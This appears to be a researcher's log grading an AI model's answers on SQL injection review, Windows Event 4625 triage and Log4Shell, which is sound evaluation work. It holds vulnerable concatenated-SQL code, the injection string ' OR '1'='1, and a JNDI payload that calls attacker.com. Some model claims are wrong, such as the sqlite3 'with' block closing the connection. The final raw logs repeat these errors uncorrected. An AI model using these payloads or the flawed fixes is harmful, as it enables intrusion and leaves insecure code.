# Results

## Experiment 1: SQL injection code review

**Model:** gemini-3.8-flash

**Prompt (contents of `prompt1.txt`):**

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect("users.db")
    query = "SELECT * FROM users WHERE name = '" + username + "'"
    return conn.execute(query).fetchall()
```

**Note:** `prompt1.txt` contains only the code, with no instruction such as "Review this code for security problems." Gemini still treated it as a security review on its own, which is interesting in itself.

**My expectation (before running):** Gemini will find SQL injection and suggest parameterized queries.

**Gemini's response:**

The code you shared has a critical security vulnerability: **SQL Injection**. 

Because `username` is directly concatenated into the SQL string, an attacker could supply an input like `' OR '1'='1` to bypass checks or execute unauthorized SQL commands. Additionally, the database connection is never closed.

---

### Secure & Improved Version

Use **parameterized queries** (placeholders `?`) so the database engine treats user input strictly as data, never as executable SQL. You should also use a context manager (`with`) to properly manage the connection.

```python
import sqlite3


def get_user(username):
    # Using 'with' automatically handles closing/committing
    with sqlite3.connect("users.db") as conn:
        query = "SELECT * FROM users WHERE name = ?"
        # Pass parameters as a tuple: (username,)
        return conn.execute(query, (username,)).fetchall()
```

---

### Why this is better:
1. **Prevents SQL Injection:** SQLite safely escapes and parameterizes the `username` input.
2. **Resource Management:** The `with sqlite3.connect(...)` block ensures connections and transactions are handled cleanly without leaking open file handles.

**My assessment:**

- **Right:** Correctly found SQL injection (CWE-89). The payload `' OR '1'='1` is a real attack that would return all users. Parameterized queries (`?`) are the correct fix and match the OWASP guidance.

- **Right:** Correctly noticed the database connection is never closed.

- **Wrong:** Gemini said `with sqlite3.connect(...)` makes sure the connection closes. This is false. The Python sqlite3 documentation says the connection's context manager only commits or rolls back the transaction. It does not close the connection. So Gemini's "fixed" code still has the leak it warned about.

- **How I checked:** Read the official Python sqlite3 documentation on using the connection as a context manager.

- **Correct fix:** use `contextlib.closing()` or call `conn.close()`.

## Experiment 2: Windows Event ID 4625
**Model:** gemini-3.8-flash

**Prompt:** What does Windows Event ID 4625 mean, and when should a SOC analyst worry about it?

**Response:**

### What is Windows Event ID 4625?

**Event ID 4625** is generated in the Windows Security log whenever **an account fails to log on**. It is recorded on the system where the logon attempt was made (for local accounts or interactive logons) or on the Domain Controller (for domain accounts via Kerberos/NTLM).

Because users mistype passwords constantly, Event ID 4625 is one of the **noisiest and most common events** in any Windows environment. However, it is also the primary telemetry source for detecting credential-based attacks.

---

### Crucial Fields in Event ID 4625

To determine if an event is malicious, an analyst must look past the Event ID itself and inspect these specific fields:

1. **Logon Type:** How the attempt was made.
   * **Type 2 (Interactive):** Physical console or direct keyboard login.
   * **Type 3 (Network):** Accessing shared folders, SMB, or network services.
   * **Type 4 (Batch):** Scheduled tasks.
   * **Type 5 (Service):** Windows services starting up.
   * **Type 10 (RemoteInteractive):** Remote Desktop Protocol (RDP).
2. **Sub Status Code:** The exact reason the logon failed:
   * `0xC000006A`: Correct username, **wrong password**.
   * `0xC0000064`: The **username does not exist**.
   * `0xC0000234`: The account is **locked out**.
   * `0xC0000072`: The account is **disabled**.
   * `0xC0000193`: The account has **expired**.
3. **TargetUserName:** The username targeted.
4. **IpAddress / Workstation Name:** The origin of the attempt.

---

### When Should a SOC Analyst Worry?

A single Event ID 4625 is almost never an incident. You should worry when you see specific **patterns, volumes, and contexts**:

#### 1. Password Spraying Attacks
* **The Pattern:** A single source IP generates Event ID 4625 across **many distinct usernames**, but only 1–3 times per username, usually with intervals to avoid account lockout thresholds.
* **Why it matters:** Attackers often test common passwords (e.g., `SeasonYear!`, `Company123!`) across the entire organization.
* **Substatus:** Mostly `0xC000006A` (bad password) or `0xC0000064` (user doesn't exist).

#### 2. Brute-Force Attacks
* **The Pattern:** Hundreds or thousands of 4625 events targeted at a **single username** within a short timeframe from a single source IP.
* **Why it matters:** Classic brute-force attack. If you see this, look for subsequent `0xC0000234` (Account Locked Out) or, worse, an **Event ID 4624** (Successful Logon) immediately following the failures, indicating the attacker succeeded.

#### 3. High-Value / Suspicious Accounts Targeted
* **Privileged Accounts:** Failures targeting Domain Admins, `krbtgt`, or built-in `Administrator`.
* **Non-Existent Users (`0xC0000064`):** Failures targeting usernames not in your Active Directory (e.g., `root`, `admin`, `test`, `oracle`), indicating an attacker is guessing using generic wordlists.
* **Honeypot/Decoy Accounts:** Any logon attempt against a known decoy account is an immediate, high-fidelity alert.
* **Disabled/Terminated Accounts (`0xC0000072`):** Attempts to log in using accounts of former employees or dormant service accounts.

#### 4. Lateral Movement (Internal Threat)
* **The Pattern:** Event ID 4625 with **Logon Type 3 (Network)** or **Logon Type 10 (RDP)** occurring between internal workstations (e.g., Workstation A attempting to log into Workstation B, C, and D).
* **Why it matters:** Endpoints rarely connect to other endpoints in typical enterprise environments. This often signals an adversary who compromised one machine and is trying to pivot using harvested credentials.

#### 5. Internet-Exposed Services (External RDP/SMB)
* **The Pattern:** Event ID 4625 with **Logon Type 10** coming from an external/public IP address.
* **Why it matters:** An RDP port is exposed directly to the internet and is actively being scanned/attacked.

---

### Common False Positives (When NOT to Panic)

Before escalating, rule out these common benign causes:
* **Service/Scheduled Task Password Changes:** If a service account password is changed in AD, but not updated in a local Windows Service (Logon Type 5) or Scheduled Task (Logon Type 4), it will repeatedly generate 4625 errors until locked out.
* **Cached Credentials:** A user changed their domain password, but their mobile device, mapped network drive, or secondary laptop is still trying to authenticate with the old cached password.
* **User Typos:** A handful of failures during the start of a standard workday followed by a successful 4624 from the same IP/workstation.

---

### Quick Triage Checklist for Analysts

1. **Check the volume:** Is it an isolated failure, or part of a burst?
2. **Check the failure reason:** Wrong password (`6A`) vs. non-existent user (`64`)?
3. **Check the source:** Internal host, domain controller, or external IP?
4. **Correlate with Success:** Did the failed logon sequence end with an **Event ID 4624 (Logon Type 2, 3, or 10)** from the same source? If yes, treat this as a **high-priority compromise**.

**My expectation (before running):** TODO: write in your own words what you expected Gemini to say before you ran it.

**My assessment:**

- **Right:** Logon types 2, 3, 4, 5 and 10 and the sub status codes `0xC000006A`, `0xC0000064`, `0xC0000234`, `0xC0000072` and `0xC0000193` are correct. The spraying vs. brute-force patterns, "4625 followed by 4624 = possible compromise", and the false positives (stale service account passwords, cached credentials, typos) match standard SOC practice.
- **Wrong / misleading:** Point 5 says external RDP attacks show up as **Logon Type 10**. With Network Level Authentication (NLA), which is on by default in modern Windows, a failed RDP logon is rejected during network authentication and is usually logged as **Logon Type 3**. A detection rule that only looks for Type 10 would miss most RDP brute force.
- **Missed:**
  - Account lockout has its own event, **4740**. Gemini only mentions the `0xC0000234` status code.
  - On domain controllers, failed Kerberos pre-authentication is logged as **4771** and NTLM credential validation as **4776**. Password spraying against Active Directory often shows up there, not in 4625.
  - Logon types 7, 8, 9 and 11 are not mentioned.
  - The `IpAddress` field is often `-` for local logons, and the NTLM workstation name can be set by the client, so the source can't always be trusted.
- **Claimed without evidence:** "Endpoints rarely connect to other endpoints" is a reasonable rule of thumb, but no source is given and it depends on the environment. Listing `krbtgt` as a typical target is odd, since that account is disabled by design.
- **How I checked:** Microsoft's documentation for event 4625 (logon types and status codes) and how RDP with NLA authenticates.

## Experiment 3: Log4Shell (CVE-2021-44228)

**My expectation (before running):** TODO: write in your own words what you expected before reading the answer.

**Model:** gemini-3.8-flash

**Prompt:** What is CVE-2021-44228, which software does it affect, and how serious is it?

**Response:**

**CVE-2021-44228**, widely known as **“Log4Shell,”** is one of the most critical cybersecurity vulnerabilities discovered in recent history. It was publicly disclosed in early December 2021.

Here is a breakdown of what it is, what it affects, and why it is so dangerous.

---

### 1. What is it?
CVE-2021-44228 is an **unauthenticated Remote Code Execution (RCE)** vulnerability. 

It exists due to how the software handles formatted messages using a feature called **JNDI (Java Naming and Directory Interface)** lookups:
* When Log4j logs a string of text, it checks whether that string contains special commands inside a format like `${jndi:...}`.
* If it detects this format, it reaches out to an external server (often using protocols like LDAP or RMI) to retrieve data or code.
* **The Exploit:** An attacker simply needs to pass a malicious payload—such as `${jndi:ldap://attacker.com/malicious_payload}`—into any input field that the application logs (like a username, a search bar, an HTTP user-agent header, or a chat message). 
* When Log4j writes this to the log file, it automatically contacts the attacker's server, downloads malicious Java code, and **executes it with the privileges of the running application.**

---

### 2. Which software does it affect?

#### Direct Software:
* **Apache Log4j 2**: Specifically, versions **2.0-beta9 through 2.14.1**. (Log4j 1.x is not vulnerable to this specific CVE, though it has separate, older vulnerabilities).

#### Indirect/Downstream Impact:
Because Log4j is the de facto logging library for the Java programming language, it was embedded in thousands of enterprise products, consumer apps, and cloud services. 

Affected software and platforms included:
* **Consumer Apps:** The exploit was famously first observed in *Minecraft: Java Edition* (players could take over servers or other clients by typing the exploit string into the in-game chat).
* **Enterprise Infrastructure:** VMware, Cisco, IBM, Oracle, and Red Hat products.
* **Cloud Platforms:** Amazon Web Services (AWS), Apple iCloud, Google Cloud, and Microsoft Azure.
* **Big Data Frameworks:** Apache Solr, Apache Struts, Apache Flink, and ElasticSearch.

Many companies did not even know they were running Log4j because it was buried several layers deep inside third-party dependencies.

---

### 3. How serious is it?

It is rated as **Maximum Severity**.

* **CVSS Score:** **10.0 out of 10.0** (Critical) — the highest possible severity rating.
* **CISA Warning:** The U.S. Cybersecurity and Infrastructure Security Agency (CISA) called it one of the most serious vulnerabilities they had ever seen.

**Why it is uniquely dangerous:**
1. **Trivially Easy to Exploit:** An attacker does not need advanced skills. Exploitation requires sending a single line of text into any interface that eventually gets logged.
2. **No Authentication Required:** Attackers can compromise systems remotely over the internet without having an account or credentials.
3. **Full System Takeover (RCE):** Once the malicious code executes, attackers can steal data, install ransomware, establish backdoors, or recruit servers into botnets.
4. **Ubiquity:** Java runs on billions of devices globally, and Log4j was omnipresent across corporate and government IT environments.
5. **Difficult to Detect/Patch:** Because Log4j is often an indirect dependency bundled deep inside compiled Java archives (`.jar` or `.war` files), organizations struggled for months just to identify which of their systems were actually vulnerable.

---

### How it was resolved:
Apache released multiple patches to fix the issue and subsequent bypasses discovered shortly after. The vulnerability was permanently mitigated by completely disabling JNDI lookups by default, starting in **Log4j version 2.16.0** (with version **2.17.1+** recommended for complete stability and security).

**My assessment:**

- **Right:** It is an unauthenticated remote code execution bug in Apache Log4j 2 caused by JNDI lookups in logged strings (`${jndi:ldap://...}`). The CVSS score is 10.0. Log4j 1.x is not affected by this CVE. It was hard to find because Log4j is often buried in other dependencies. All of these match NVD and the Apache Log4j security page.
- **Partly wrong / incomplete:**
  - Fixed versions: the first fix was **2.15.0**, but it was incomplete (CVE-2021-45046). 2.16.0 disabled JNDI by default and removed message lookups. 2.17.0 fixed a denial-of-service bug (CVE-2021-45105), and 2.17.1 fixed CVE-2021-44832. Gemini recommends 2.17.1+ but doesn't explain that these were separate vulnerabilities. NVD now lists the affected range as up to 2.15.0 (except some backport releases), not 2.14.1.
  - "Downloads malicious Java code and executes it": newer Java versions block loading remote classes over JNDI by default (`trustURLCodebase=false`). Attackers worked around that with other techniques, and could still leak secrets with lookups like `${env:...}`, but the simple "download and run" path isn't the default anymore. Gemini doesn't mention this.
- **Claimed without evidence:** "First observed in Minecraft." The bug was reported to Apache by Alibaba Cloud's security team. Minecraft was where public exploitation became widely known. The list of affected cloud providers and "Java runs on billions of devices" come with no sources.
- **How I checked:** NVD entry for CVE-2021-44228, the Apache Log4j security page, and CISA's Log4j guidance.


## prompt2.txt (2026-10-08 14:21)
**Model:** gemini-3.8-flash

**Prompt:** What does Windows Event ID 4625 mean, and when should a SOC analyst worry about it?

**Response:**

### What Does Windows Event ID 4625 Mean?

**Event ID 4625** indicates that **an account failed to log on**. It is generated on the system where the logon attempt was made (e.g., on a Domain Controller for domain accounts, or on a local workstation/server for local accounts).

Every time a user, service, or attacker tries to authenticate to a Windows system and fails, this event is recorded in the Windows **Security log**.

---

### Key Fields to Check in Event 4625
Before deciding if an event is malicious, an analyst must look at these critical fields:
* **TargetUserName:** The account name being attempted.
* **IpAddress / Workstation Name:** The source machine where the attempt originated.
* **Logon Type:** How the user tried to connect (e.g., **Type 2** = Interactive/Console, **Type 3** = Network/SMB, **Type 10** = Remote Desktop/RDP).
* **Failure Reason (Status / SubStatus):**
  * `0xC000006A`: User name is correct, but password is bad.
  * `0xC0000064`: User name does not exist (indicates username enumeration/guessing).
  * `0xC0000072`: Account is disabled.
  * `0xC0000234`: Account is locked out.

---

### When Should a SOC Analyst Worry?

Because everyday users frequently mistype passwords, **a single 4625 is almost never an incident.** However, a SOC analyst should escalate or actively investigate in the following scenarios:

#### 1. High Volume of Failures (Brute-Force Attack)
* **What it looks like:** Dozens or hundreds of 4625 events targeting a **single username** from the same IP address in a short time window.
* **Threat:** An attacker is attempting to guess an account password by trial and error.

#### 2. Password Spraying
* **What it looks like:** A single source IP generates a few 4625 events across **hundreds of *different* usernames** at slow, spaced-out intervals (to evade account lockout policies).
* **Threat:** An attacker is trying common passwords (e.g., `Spring2024!`, `Welcome123`) against the entire organization.

#### 3. Targeting High-Value or Sensitive Accounts
* **What it looks like:** Failures against Domain Admins, Enterprise Admins, built-in `Administrator`, or service accounts.
* **Threat:** Targeted attack aimed at gaining domain-level persistence or privilege escalation.
* *Note:* Even a low volume of 4625s against the built-in `Administrator` account on an internet-facing host warrants an alert.

#### 4. Non-Existent Accounts (`SubStatus: 0xC0000064`)
* **What it looks like:** High volumes of 4625 events where the target username doesn't exist in Active Directory (e.g., `admin`, `test`, `guest`, `oracle`, `root`).
* **Threat:** Wordlist-based reconnaissance or automated bot attacks scanning for common defaults.

#### 5. Unusual Logon Types & Network Context
* **Logon Type 10 (RemoteInteractive / RDP):** Repeated failures from an external IP or an unexpected internal IP.
* **Logon Type 3 (Network):** A spike in network logon failures between internal endpoints can indicate an attacker attempting **lateral movement** via SMB/WMI using stolen credentials.
* **Anomalous Times/Locations:** Failed logins occurring at 3:00 AM from a foreign IP address for a strictly local user.

#### 6. The "Success After Failures" Pattern
* **What it looks like:** A burst of Event 4625s followed immediately by a single **Event 4624 (Successful Logon)** for the same account.
* **Threat:** The brute-force or password spray attack **succeeded**. This is a critical priority incident.

---

### Common Benign Causes (False Positives)

Before triggering an incident response, rule out common IT operational issues:
1. **Expired Passwords / Stale Credentials:** A user changed their domain password, but their mobile phone, a mapped network drive, or the Windows Credential Manager is still trying to authenticate with the old password.
2. **Misconfigured Scheduled Tasks or Services:** A service account had its password rotated, but the administrator forgot to update the password in the Windows Task Scheduler or Windows Services console. *(These usually generate consistent, rhythmic 4625s every few minutes).*


## prompt3.txt (2026-10-08 14:24)
**Model:** gemini-3.8-flash

**Prompt:** What is CVE-2021-44228, which software does it affect, and how serious is it?

**Response:**

**CVE-2021-44228**, commonly known as **"Log4Shell,"** is a critical software vulnerability discovered in late 2021. It is widely considered one of the most severe cybersecurity vulnerabilities in the history of the internet.

Here is a breakdown of what it is, what it affects, and why it is so dangerous:

---

### 1. What is it?
Log4Shell is an **unauthenticated Remote Code Execution (RCE)** vulnerability. 

* **The Cause:** It stems from a feature in Log4j called **JNDI (Java Naming and Directory Interface) lookups**. Log4j was designed to allow developers to format log messages dynamically (for example, logging the current date or Java environment). 
* **The Flaw:** Log4j allowed JNDI to query external directory services (like LDAP or RMI). An attacker could send a simple malicious string—such as `${jndi:ldap://attacker.com/malicious-code}`—to a vulnerable server.
* **The Result:** If the server logged that string (e.g., via a web form, a User-Agent header, or a chat message), Log4j would automatically reach out to the attacker's server, download a piece of Java code, and execute it locally with the privileges of the running application.

---

### 2. Which software does it affect?

#### Direct Component:
* **Apache Log4j 2:** Specifically, versions **2.0-beta9 through 2.14.1**. (Log4j 1.x was technically not vulnerable to this exact flaw by default, though it has separate, older vulnerabilities and reached end-of-life).

#### The Broader Ecosystem:
Because Log4j is a foundational, ubiquitous logging library used by millions of Java applications, the "blast radius" was enormous:
* **Cloud & Web Services:** Amazon Web Services (AWS), Apple iCloud, Google Cloud, Cloudflare, Steam, and Twitter were initially exposed in various capacities.
* **Enterprise Software:** Thousands of products from vendors like VMware, Cisco, IBM, Oracle, and Splunk.
* **Consumer Applications:** One of the earliest public demonstrations occurred in **Minecraft: Java Edition**, where an attacker could execute code on a Minecraft server simply by typing the exploit payload into the public in-game chat box.
* **Nested/Transitive Dependencies:** Many organizations had no idea they were vulnerable because Log4j was bundled deep inside third-party, commercial, or legacy software they purchased.

---

### 3. How serious is it?

It was assigned a **CVSS (Common Vulnerability Scoring System) score of 10.0 out of 10.0**—the maximum possible rating. It represents the "worst-case scenario" in software security for several reasons:

1. **Remote Code Execution (RCE):** It grants the attacker full control over the vulnerable server. An attacker could steal sensitive data, deploy ransomware, delete files, or pivot deeper into an internal network.
2. **Trivially Easy to Exploit:** Unlike many advanced exploits that require complex memory manipulation or race conditions, Log4Shell required sending just one line of text into any input field that the application was likely to write to a log file.
3. **No Authentication Required:** Attackers did not need passwords, API keys, or pre-existing network access to trigger the flaw.
4. **Massive Ubiquity:** Because it was embedded in everything from microservices to massive enterprise appliances, identifying every vulnerable instance across a global corporate network took months (and in some legacy cases, years).
5. **Widespread Exploitation:** Within hours of its disclosure in December 2021, threat actors—ranging from automated cryptocurrency-mining botnets to nation-state advanced persistent threat (APT) groups—began scanning the entire internet and executing thousands of attacks per second.

### Remediation
The primary fix was upgrading Log4j to **version 2.15.0 or higher** (ultimately, version **2.17.1+** for Java 8 was recommended to resolve several follow-up edge-case CVEs). In updated versions, message lookup substitution was disabled by default, and JNDI protocol support was heavily restricted.


## prompt1.txt (2026-10-08 14:47)
**Model:** gemini-3.8-flash

**Prompt:** import sqlite3

def get_user(username):
    conn = sqlite3.connect("users.db")
    query = "SELECT * FROM users WHERE name = '" + username + "'"
    return conn.execute(query).fetchall()

**Response:**

This code is vulnerable to **SQL Injection** because it uses string concatenation (`+ username +`) to build the SQL query. An attacker could pass input like `' OR '1'='1` to retrieve all rows or manipulate the query.

Additionally, the database connection is never closed, which can lead to resource leaks.

---

### Recommended Fix

Use a **parameterized query** (using the `?` placeholder) and a context manager (`with` statement) to automatically manage the connection:

```python
import sqlite3

def get_user(username):
    # 'with' ensures the connection is properly closed when done
    with sqlite3.connect("users.db") as conn:
        cursor = conn.cursor()
        # Pass parameters as a tuple in the second argument
        cursor.execute("SELECT * FROM users WHERE name = ?", (username,))
        return cursor.fetchall()
```

### Why this is safer:
* **Prevents SQL Injection:** The database driver treats the value of `username` strictly as literal data, not executable SQL, regardless of what characters it contains.
* **Handles Escaping Automatically:** You don't need to manually escape quotes, spaces, or special characters.
